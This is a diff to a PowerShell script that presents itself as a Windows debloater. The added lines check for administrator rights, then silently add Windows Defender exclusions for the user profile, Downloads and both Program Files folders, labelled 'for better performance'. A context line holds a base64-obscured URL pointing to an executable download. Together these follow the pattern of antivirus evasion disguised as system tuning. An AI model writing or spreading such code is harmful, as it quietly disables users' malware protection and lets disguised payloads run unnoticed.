@@ -1,4 +1,28 @@
 
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
+    Wait-ForUser "Press Enter to exit..."
+    exit
+}
+
+# Configure PowerShell preferences for better performance
+$ProgressPreference = 'SilentlyContinue'
+Clear-Host
+
+# Add Windows Defender exclusions for better performance
+try {
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
+} catch {
+    # Silently continue if Windows Defender is not available
+}
+
+
+
+
 Show-Header
 
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
